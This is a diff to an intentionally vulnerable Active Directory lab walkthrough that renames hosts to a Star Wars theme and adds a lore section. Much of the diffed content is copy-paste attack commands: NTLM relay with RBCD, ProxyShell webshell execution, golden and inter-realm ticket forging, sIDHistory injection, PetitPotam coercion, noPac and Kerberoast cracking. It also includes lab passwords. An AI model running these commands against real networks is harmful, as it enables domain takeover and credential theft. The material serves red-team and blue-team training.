+│   -t ldaps://coruscant        │ ───────────────▶ │ add new attacker   │
+│   -wh wpad.empire.local    │                  │ machine acct +     │
 │   --delegate-access      │                  │ set RBCD on victim │
 └──────────────────────────┘                  └─────────┬──────────┘
                                                          │ getST -impersonate Administrator
@@ -631,20 +631,20 @@ Prevent: disable IPv6 if unused, or RA Guard / DHCPv6 Guard on switches; deploy 
 
 ```bash
 # 1. Become the IPv6 router + DNS on the segment
-sudo mitm6 -d corp.local -i <attacker_iface>
+sudo mitm6 -d empire.local -i <attacker_iface>
 
 # 2. In parallel, relay any inbound NTLM (machine accts auto-auth) to LDAPS
 #    --delegate-access creates evil$ + writes RBCD on the victim
-sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh wpad.corp.local \
+sudo impacket-ntlmrelayx -6 -t ldaps://coruscant.empire.local -wh wpad.empire.local \
                          --delegate-access --no-smb-server
 
 # 3. After ntlmrelayx logs "set msDS-AllowedToActOnBehalfOfOtherIdentity"
-impacket-getST -spn cifs/<victim>.corp.local -impersonate Administrator \
-               corp.local/<evil_machine>\$:'<pwd_from_relay_output>' -dc-ip 10.10.0.10
+impacket-getST -spn cifs/<victim>.empire.local -impersonate Administrator \
+               empire.local/<evil_machine>\$:'<pwd_from_relay_output>' -dc-ip 10.10.0.10
 
 # 4. SYSTEM on the victim
-export KRB5CCNAME=Administrator@cifs_<victim>.corp.local@CORP.LOCAL.ccache
-impacket-psexec -k -no-pass <victim>.corp.local
+export KRB5CCNAME=Administrator@cifs_<victim>.empire.local@empire.local.ccache
+impacket-psexec -k -no-pass <victim>.empire.local
 ```
 
 ---
@@ -679,17 +679,17 @@ Prevent: patch (KB5003435+); EM/EAC URL rewrite rule; remove pre-Nov-2019 Exchan
 **Commands (copy-paste):**
 
 ```bash
-# NOTE: DVAD does not ship Exchange by default — this pattern is documented for
+# NOTE: EMPIRE does not ship Exchange by default — this pattern is documented for
 # operators who add a vulnerable Exchange VM to extend the lab.
 
 # 1. Identify Exchange + email enumeration
-python3 ProxyShell.py -t https://exchange.corp.local -e Administrator@corp.local
+python3 ProxyShell.py -t https://exchange.empire.local -e Administrator@empire.local
 
 # 2. Drop webshell via mailbox export (CVE chain CVE-2021-34473/34523/31207)
-python3 ProxyShell-Auto.py --target exchange.corp.local --email Administrator@corp.local
+python3 ProxyShell-Auto.py --target exchange.empire.local --email Administrator@empire.local
 
 # 3. Webshell → command exec → DCSync (Exchange has WriteDACL on Domain pre-Nov-2019)
-curl 'https://exchange.corp.local/aspnet_client/shell.aspx?cmd=whoami'
+curl 'https://exchange.empire.local/aspnet_client/shell.aspx?cmd=whoami'
 ```
 
 ---
@@ -699,7 +699,7 @@ curl 'https://exchange.corp.local/aspnet_client/shell.aspx?cmd=whoami'
 ```
 ┌────────────────┐  DHCP option 60/66/67       ┌────────────────────┐
 │ Attacker Kali  │ ─── boot from PXE  ────────▶│ SCCM DP / WDS      │
-│ + pxeboot.py   │                              │ ws-pxe.corp.local  │
+│ + pxeboot.py   │                              │ ws-pxe.empire.local  │
 └────────┬───────┘                              └─────────┬──────────┘
          │                                                 │ TFTP boot.wim
          │                              ◀───────── policy.xml + media
@@ -727,10 +727,10 @@ Prevent: PXE password enforced; enhanced HTTP / PKI mode; NAA deprecated → use
 **Commands (copy-paste):**
 
 ```bash
-# NOTE: DVAD doesn't ship SCCM; pattern documented for operators who add it.
+# NOTE: EMPIRE doesn't ship SCCM; pattern documented for operators who add it.
 
 # 1. PXE boot from attacker VM on same L2
-python3 PXEThief.py -d corp.local --target ws-pxe.corp.local
+python3 PXEThief.py -d empire.local --target ws-pxe.empire.local
 # OR boot a UEFI shell, capture WIM/SDI variable file
 
 # 2. Decrypt the TS variables file (empty PXE password ⇒ blob is decryptable)
@@ -746,7 +746,7 @@ nxc smb 10.10.0.0/24 -u <NAA_USER> -p '<NAA_PASS>'
 
 ```
 ┌────────────────┐   physical drop             ┌──────────────────────┐
-│ Attacker (you) │ ── "Salaries Q3.zip" ──────▶│ User on ws01         │
+│ Attacker (you) │ ── "Salaries Q3.zip" ──────▶│ User on tatooine         │
 │ packaged ZIP   │     contains .library-ms    │ unzips, Explorer     │
 │ w/ .library-ms │     → CVE-2025-24071        │ previews .library-ms │
 └────────┬───────┘                              └──────────┬───────────┘
@@ -804,7 +804,7 @@ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 │ SHIELD Agents  │ ────── GenericWrite ───────▶ │ Avengers Admins      │
 │ nick.fury      │ ──────── WriteOwner ───────▶ │ Domain Admins        │
 │ steve.rogers   │ ─────── GenericAll ────────▶ │ AdminSDHolder        │
-│ loki           │ ─────── GenericAll ────────▶ │ FILE01$ & SQL01$     │
+│ loki           │ ─────── GenericAll ────────▶ │ scarif$ & kamino$     │
 └────────────────┘                              └──────────────────────┘
 ```
 
@@ -824,83 +824,83 @@ Prevent: Tidy up misconfigured ACLs using BloodHound data; enforce tiering model
 
 ---
 
-## 10h. Wireframe — Pattern P: ExtraSID (Child → Parent, finance.local variant)
+## 10h. Wireframe — Pattern P: ExtraSID (Child → Parent, rebel.local variant)
 
-DVAD has parent-child trust `corp.local` ↔ `eu.corp.local` and external trusts to
-`finance.local` and `root.corp`. Pattern G covered `eu` → `corp`. Pattern P is the
+EMPIRE has parent-child trust `empire.local` ↔ `eu.empire.local` and external trusts to
+`rebel.local` and `trade.corp`. Pattern G covered `eu` → `corp`. Pattern P is the
 same primitive applied to the alternate path (corp → eu) and useful when you
-land on `dc01.eu` first and need to pivot down a tier.
+land on `coruscant.eu` first and need to pivot down a tier.
 
 ```
-corp.local DA  ──DCSync krbtgt─▶  forge inter-realm TGT with /sids:<EU-DA-SID>
-                                 ──asktgs cifs/dc01.eu──▶ EU SYSTEM
+empire.local DA  ──DCSync krbtgt─▶  forge inter-realm TGT with /sids:<EU-DA-SID>
+                                 ──asktgs cifs/coruscant.eu──▶ EU SYSTEM
 ```
 
 **Commands:**
 
 ```bash
-impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
-impacket-lookupsid corp.local/Administrator@10.10.0.10 'eu.corp.local' | head
+impacket-secretsdump -just-dc-user krbtgt empire.local/Administrator@10.10.0.10
+impacket-lookupsid empire.local/Administrator@10.10.0.10 'eu.empire.local' | head
 impacket-ticketer -nthash <corp_krbtgt_nt> -domain-sid <CORP_SID> \
-                  -domain corp.local -extra-sid <EU_SID>-512 \
-                  -spn 'krbtgt/eu.corp.local' Administrator
+                  -domain empire.local -extra-sid <EU_SID>-512 \
+                  -spn 'krbtgt/eu.empire.local' Administrator
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn cifs/dc01.eu.corp.local -impersonate Administrator corp.local/Administrator
-impacket-secretsdump -k -no-pass -just-dc eu.corp.local/Administrator@dc01.eu.corp.local
+impacket-getST -k -no-pass -spn cifs/deathstar.eu.empire.local -impersonate Administrator empire.local/Administrator
+impacket-secretsdump -k -no-pass -just-dc eu.empire.local/Administrator@deathstar.eu.empire.local
 ```
 
 ---
 
-## 10g. Wireframe — Pattern Q: Trust Key forge → finance.local (external trust)
+## 10g. Wireframe — Pattern Q: Trust Key forge → rebel.local (external trust)
 
-Identical to Pattern I but written out per-DVAD-host so the SIDs and DNS names
-are concrete. External trust → SID filtering is **disabled** in DVAD on every
+Identical to Pattern I but written out per-EMPIRE-host so the SIDs and DNS names
+are concrete. External trust → SID filtering is **disabled** in EMPIRE on every
 external trust (the lab spec says so).
 
 ```
-Dump trust-account hash for FINANCE$/corp.local → forge inter-realm TGT
-→ TGS for cifs/dc01.finance.local → DCSync finance.local
+Dump trust-account hash for REBEL$/empire.local → forge inter-realm TGT
+→ TGS for cifs/yavin4.rebel.local → DCSync rebel.local
 ```
 
 **Commands:**
 
 ```bash
-# 1. Trust key dump (run as Administrator@corp.local)
-impacket-secretsdump -just-dc-user 'FINANCE$' corp.local/Administrator@10.10.0.10
+# 1. Trust key dump (run as Administrator@empire.local)
+impacket-secretsdump -just-dc-user 'REBEL$' empire.local/Administrator@10.10.0.10
 
 # 2. Get finance EA SID
-impacket-lookupsid finance.local/<low_priv>:'<pw>'@10.20.0.10 | grep -i 'enterprise'
+impacket-lookupsid rebel.local/<low_priv>:'<pw>'@10.20.0.10 | grep -i 'enterprise'
 
 # 3. Forge inter-realm TGT
 impacket-ticketer -nthash <FINANCE_trustkey_nt> -domain-sid <CORP_SID> \
-                  -domain corp.local -extra-sid <FIN_SID>-519 \
-                  -spn 'krbtgt/finance.local' Administrator
+                  -domain empire.local -extra-sid <FIN_SID>-519 \
+                  -spn 'krbtgt/rebel.local' Administrator
 
 # 4. Ask cross-realm TGS and DCSync
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
-impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
+impacket-getST -k -no-pass -spn cifs/yavin4.rebel.local -impersonate Administrator empire.local/Administrator
+impacket-secretsdump -k -no-pass -just-dc rebel.local/Administrator@yavin4.rebel.local
 ```
 
 ---
 
-## 10h. Wireframe — Pattern R: Tree-Root trust → root.corp (Golden Cross-Forest)
+## 10h. Wireframe — Pattern R: Tree-Root trust → trade.corp (Golden Cross-Forest)
 
-`root.corp` is wired as a tree-root trust to `corp.local`. The forge primitive is
+`trade.corp` is wired as a tree-root trust to `empire.local`. The forge primitive is
 the same, but the TGT SPN target changes and the foreign forest's root SID is what
 you append.
 
 **Commands:**
 
 ```bash
-impacket-secretsdump -just-dc-user 'ROOT$' corp.local/Administrator@10.10.0.10
-impacket-lookupsid root.corp/<low_priv>:'<pw>'@10.30.0.10 | grep -i 'enterprise'
+impacket-secretsdump -just-dc-user 'TRADE$' empire.local/Administrator@10.10.0.10
+impacket-lookupsid trade.corp/<low_priv>:'<pw>'@10.30.0.10 | grep -i 'enterprise'
 impacket-ticketer -nthash <ROOT_trustkey_nt> -domain-sid <CORP_SID> \
-                  -domain corp.local -extra-sid <ROOT_SID>-519 \
-                  -spn 'krbtgt/root.corp' Administrator
+                  -domain empire.local -extra-sid <ROOT_SID>-519 \
+                  -spn 'krbtgt/trade.corp' Administrator
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn cifs/dc01.root.corp -impersonate Administrator corp.local/Administrator
-impacket-secretsdump -k -no-pass -just-dc root.corp/Administrator@dc01.root.corp
+impacket-getST -k -no-pass -spn cifs/neimoidia.trade.corp -impersonate Administrator empire.local/Administrator
+impacket-secretsdump -k -no-pass -just-dc trade.corp/Administrator@neimoidia.trade.corp
 ```
 
 ---
@@ -908,14 +908,14 @@ impacket-secretsdump -k -no-pass -just-dc root.corp/Administrator@dc01.root.corp
 ## 10i. Wireframe — Pattern S: Foreign-Security-Principal (FSP) hijack
 
 Cross-forest group memberships go through Foreign Security Principal objects in
-`CN=ForeignSecurityPrincipals,DC=<domain>`. DVAD intentionally maps a foreign
+`CN=ForeignSecurityPrincipals,DC=<domain>`. EMPIRE intentionally maps a foreign
 principal that *resolves to* a privileged group in the target forest — if you can
 write the resolving SID into a group you control on the source side, you escalate
 on the target side without touching its DCs.
 
 ```
-corp.local: own a group whose members include FSP(finance.local/SID-of-Foo)
-finance.local: SID-of-Foo is in finance Domain Admins via FSP linkage
+empire.local: own a group whose members include FSP(rebel.local/SID-of-Foo)
+rebel.local: SID-of-Foo is in finance Domain Admins via FSP linkage
 → join your account to the source group → become Foo → become DA@finance
 ```
 
@@ -928,11 +928,11 @@ nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query \
 
 # 2. Use BloodHound's "Cross-Forest" path query to confirm reachability
 # 3. Write yourself into the source-side group that grants the foreign SID
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' \
   --add-computer 'evil$' --groups 'CrossForestGroup'
 
-# 4. Authenticate to finance.local — your token now carries the foreign SID
-impacket-psexec finance.local/peter.parker:'DVADlab2024!'@10.20.0.10
+# 4. Authenticate to rebel.local — your token now carries the foreign SID
+impacket-psexec rebel.local/peter.parker:'EmpireLab2024!'@10.20.0.10
 ```
 
 ---
@@ -940,19 +940,19 @@ impacket-psexec finance.local/peter.parker:'DVADlab2024!'@10.20.0.10
 ## 10j. Wireframe — Pattern T: Cross-Forest Kerberoast (no creds in foreign forest)
 
 If foreign trust allows TGS issuance for SPNs that resolve in the foreign forest
-(common when SID filtering is off), you can kerberoast accounts in `finance.local`
-using a TGT from `corp.local`.
+(common when SID filtering is off), you can kerberoast accounts in `rebel.local`
+using a TGT from `empire.local`.
 
 **Commands:**
 
 ```bash
-# Need a TGT in corp.local first (any user works)
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+# Need a TGT in empire.local first (any user works)
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 export KRB5CCNAME=peter.parker.ccache
 
 # Request TGSes for cross-forest SPNs
-impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
-                     -request corp.local/peter.parker -outputfile xforest.kerberoast
+impacket-GetUserSPNs -k -no-pass -target-domain rebel.local -dc-ip 10.20.0.10 \
+                     -request empire.local/peter.parker -outputfile xforest.kerberoast
 
 hashcat -m 13100 xforest.kerberoast /usr/share/wordlists/rockyou.txt
 ```
@@ -961,23 +961,23 @@ hashcat -m 13100 xforest.kerberoast /usr/share/wordlists/rockyou.txt
 
 ## 10k. Wireframe — Pattern U: ADCS Cross-Forest Enrollment (PKINIT from foreign forest)
 
-`ca01.corp.local` issues to authenticated users by default. If the cross-forest
-trust authenticates the foreign user (it does in DVAD — selective auth is off),
-the foreign user can enroll in templates in `corp.local` and PKINIT as a
-corp.local principal.
+`endor.empire.local` issues to authenticated users by default. If the cross-forest
+trust authenticates the foreign user (it does in EMPIRE — selective auth is off),
+the foreign user can enroll in templates in `empire.local` and PKINIT as a
+empire.local principal.
 
 **Commands:**
 
 ```bash
-# 1. From finance.local (low-priv), scan corp.local templates
-certipy find -u svc_x@finance.local -p '<pw>' -dc-ip 10.20.0.10 \
-             -target ca01.corp.local -stdout -vulnerable
+# 1. From rebel.local (low-priv), scan empire.local templates
+certipy find -u svc_x@rebel.local -p '<pw>' -dc-ip 10.20.0.10 \
+             -target endor.empire.local -stdout -vulnerable
 
 # 2. Enroll in ESC1 across the trust
-certipy req -u svc_x@finance.local -p '<pw>' -target ca01.corp.local \
-            -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'
+certipy req -u svc_x@rebel.local -p '<pw>' -target endor.empire.local \
+            -ca EMPIRE-CA -template ESC1Template -upn 'Administrator@empire.local'
 
-# 3. PKINIT → DA@corp.local from a foreign-forest identity
+# 3. PKINIT → DA@empire.local from a foreign-forest identity
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 ```
 
@@ -985,33 +985,33 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 
 ## 10l. Wireframe — Pattern V: SID Filtering Bypass via SID History injection
 
-DVAD disables SID filtering on every external trust (lab spec). Once you have DA
-on corp.local you can write `sIDHistory` on a target user to inject any SID,
+EMPIRE disables SID filtering on every external trust (lab spec). Once you have DA
+on empire.local you can write `sIDHistory` on a target user to inject any SID,
 including foreign EA SIDs.
 
 **Commands:**
 
 ```bash
-# 1. From DA@corp.local, use mimikatz to inject sIDHistory
+# 1. From DA@empire.local, use mimikatz to inject sIDHistory
 # (run on a Windows host that has reachability to the DC)
 mimikatz # privilege::debug
-mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:peter.parker
+mimikatz # sid::add /sid:S-1-5-21-REBEL-519 /sam:peter.parker
 
 # OR via DCShadow primitive (impacket):
-impacket-secretsdump -just-dc-user peter.parker corp.local/Administrator@10.10.0.10
+impacket-secretsdump -just-dc-user peter.parker empire.local/Administrator@10.10.0.10
 # then dcshadow.py to push the sIDHistory attribute
 
 # 2. peter.parker now carries the foreign EA SID in PAC of every TGS
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
-impacket-secretsdump -k -no-pass -just-dc finance.local/peter.parker@dc01.finance.local
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
+impacket-secretsdump -k -no-pass -just-dc rebel.local/peter.parker@yavin4.rebel.local
 ```
 
 ---
 
 ## 10m. Wireframe — Pattern W: Cross-forest unconstrained delegation
 
-`svc_legacy@corp.local` has unconstrained delegation enabled (DVAD spec). When a
-DA from `finance.local` authenticates to a host running as `svc_legacy`, the host
+`svc_legacy@empire.local` has unconstrained delegation enabled (EMPIRE spec). When a
+DA from `rebel.local` authenticates to a host running as `svc_legacy`, the host
 caches the foreign DA's TGT. Coerce a finance DC to authenticate to your
 unconstrained host and you get a usable foreign TGT.
 
@@ -1019,19 +1019,19 @@ unconstrained host and you get a usable foreign TGT.
 
 ```bash
 # 1. Confirm svc_legacy unconstrained
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation
 
-# 2. Make a service run as svc_legacy on a host you own; or use file01 if you
-#    have local admin there (DVAD wires svc_legacy as the file01 service)
-#    Then coerce dc01.finance.local to authenticate:
-impacket-PetitPotam -u peter.parker -p 'DVADlab2024!' -d corp.local \
-                    file01.corp.local 10.20.0.10
+# 2. Make a service run as svc_legacy on a host you own; or use scarif if you
+#    have local admin there (EMPIRE wires svc_legacy as the scarif service)
+#    Then coerce yavin4.rebel.local to authenticate:
+impacket-PetitPotam -u peter.parker -p 'EmpireLab2024!' -d empire.local \
+                    scarif.empire.local 10.20.0.10
 
-# 3. Dump tickets from LSASS on file01 (Rubeus monitor / mimikatz sekurlsa::tickets)
+# 3. Dump tickets from LSASS on scarif (Rubeus monitor / mimikatz sekurlsa::tickets)
 mimikatz # sekurlsa::tickets /export
 
-# 4. Use the foreign DC's TGT to DCSync finance.local
-KRB5CCNAME=dc01-finance.ccache impacket-secretsdump -k -no-pass -just-dc finance.local/dc01\$@dc01.finance.local
+# 4. Use the foreign DC's TGT to DCSync rebel.local
+KRB5CCNAME=coruscant-finance.ccache impacket-secretsdump -k -no-pass -just-dc rebel.local/coruscant\$@yavin4.rebel.local
 ```
 
 ---
@@ -1039,14 +1039,14 @@ KRB5CCNAME=dc01-finance.ccache impacket-secretsdump -k -no-pass -just-dc finance
 ## 10n. Wireframe — Pattern X: noPac across a trust
 
 `noPac` works against the foreign DC if you can reach it and the foreign DC is
-unpatched. DVAD leaves both child and external DCs unpatched.
+unpatched. EMPIRE leaves both child and external DCs unpatched.
 
 **Commands:**
 
 ```bash
-# Hit finance.local DC directly with a corp.local user (cross-realm preauth)
-impacket-noPac.py finance.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
-                  -dc-host dc01.finance.local -shell --impersonate Administrator
+# Hit rebel.local DC directly with a empire.local user (cross-realm preauth)
+impacket-noPac.py rebel.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
+                  -dc-host yavin4.rebel.local -shell --impersonate Administrator
 ```
 
 ---
@@ -1060,12 +1060,12 @@ machine account.
 **Commands:**
 
 ```bash
-# 1. Coerce dc01.finance.local to authenticate
-impacket-PetitPotam -u svc_x -p '<pw>' -d finance.local 10.10.0.1 10.20.0.10
+# 1. Coerce yavin4.rebel.local to authenticate
+impacket-PetitPotam -u svc_x -p '<pw>' -d rebel.local 10.10.0.1 10.20.0.10
 
-# 2. Relay NTLM into ca01.corp.local's ICPR
-sudo impacket-ntlmrelayx -t 'rpc://ca01.corp.local' -rpc-mode ICPR \
-                         -icpr-ca-name 'CORP-CA' -template 'Machine' -smb2support
+# 2. Relay NTLM into endor.empire.local's ICPR
+sudo impacket-ntlmrelayx -t 'rpc://endor.empire.local' -rpc-mode ICPR \
+                         -icpr-ca-name 'EMPIRE-CA' -template 'Machine' -smb2support
 ```
 
 ---
@@ -1086,7 +1086,7 @@ Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
 
 # Sapphire — pull a live PAC via S4U2Self, forge with it
 Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 \
-                  /domain:corp.local /sid:<CORP_SID> /sapphire /ptt
+                  /domain:empire.local /sid:<CORP_SID> /sapphire /ptt
 ```
 
 ---
@@ -1133,10 +1133,10 @@ When you have *something* but don't know where to go, walk this tree:
 │                                  │
 └──────────────────────────────────┘
 
-Once DA on corp.local:
-   ├── Child forest (eu.corp.local) ──▶ Pattern G (down) / Pattern P (up)
-   ├── External forest (finance.local) ──▶ Pattern Q (trust-key) / Pattern T (xforest Kerberoast) / Pattern U (xforest ADCS) / Pattern V (sIDHistory) / Pattern X (xforest noPac)
-   ├── Tree-root trust (root.corp) ──▶ Pattern R
+Once DA on empire.local:
+   ├── Child forest (eu.empire.local) ──▶ Pattern G (down) / Pattern P (up)
+   ├── External forest (rebel.local) ──▶ Pattern Q (trust-key) / Pattern T (xforest Kerberoast) / Pattern U (xforest ADCS) / Pattern V (sIDHistory) / Pattern X (xforest noPac)
+   ├── Tree-root trust (trade.corp) ──▶ Pattern R
    ├── Foreign-Security-Principal abuse ──▶ Pattern S
    ├── Unconstrained delegation across trust ──▶ Pattern W
    ├── ESC11 (NTLM relay to ICPR-RPC across trust) ──▶ Pattern Y
@@ -1195,6 +1195,88 @@ Once DA on corp.local:
 
 ---
 
-That's the lab. If you can solve every pattern above in DVAD and explain the corresponding detection + prevention to the blue team, you've earned every flag in `PLAN.md`.
+That's the lab. If you can solve every pattern above in EMPIRE and explain the corresponding detection + prevention to the blue team, you've earned every flag in `PLAN.md`.
 
 Good hunting.
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
